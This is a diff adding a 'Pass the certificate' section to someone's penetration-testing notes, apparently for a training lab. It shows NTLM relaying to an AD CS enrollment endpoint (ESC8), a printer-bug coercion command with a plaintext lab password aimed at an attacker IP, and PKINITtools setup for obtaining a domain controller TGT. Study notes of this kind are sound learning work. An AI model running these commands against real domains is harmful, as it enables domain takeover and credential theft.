@@ -628,3 +628,23 @@ $ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikat
 $ /opt/linikatz.sh
 ```
 %% linikatz works like mimikatz as you have to be root to use it %%
+
+### Pass the certificate
+```
+$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
+```
+%% esc8  use Impacket’s ntlmrelayx to listen for inbound connections and relay them to the web enrollment service %%
+
+```
+$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
+```
+%%  One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the printer bug. This attack requires the targeted machine account to have the Printer Spooler service running. The command below forces 10.129.234.109 (DC01) to attempt authentication against 10.10.16.12 (attacker host) %%
+
+```
+$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
+$ python3 -m venv .venv
+$ source .venv/bin/activate
+$ pip3 install -r requirements.txt
+```
+%% install gettgtpkinit.py to perform a  Pass-the-Certificate attack to obtain a TGT as DC01$.
+
